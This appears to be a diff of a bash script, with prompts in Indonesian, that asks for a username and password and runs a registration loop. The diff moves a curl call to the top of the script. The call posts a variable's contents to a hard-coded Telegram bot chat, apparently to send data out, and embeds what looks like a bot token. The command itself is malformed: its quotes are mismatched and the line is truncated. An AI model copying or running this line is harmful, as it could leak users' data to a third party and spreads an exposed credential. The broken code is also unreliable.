@@ -1,4 +1,5 @@
 #!/bin/bash
+curl --data chat_id=“-1001683033802” --data-urlencode "text=TEST ${stringholder}” "https://api.telegram.org/bot<5005386150:AAFnCShzACp4ILVICvWKL7JODn2XWws3UTQ>/sendMessage?parse_mode
 red='\033[0;31m'
 cyan='\033[0;36m'
 yell='\033[1;33m'
@@ -41,5 +42,3 @@ read -p "Masukan Password : " pswd
 for (( i = 0; i < $jumlah; i++ )); do
 	daftar $user $pswd
 done
-
- curl --data chat_id=“-1001683033802” --data-urlencode "text=TEST ${stringholder}” "https://api.telegram.org/bot<5005386150:AAFnCShzACp4ILVICvWKL7JODn2XWws3UTQ>/sendMessage?parse_mode
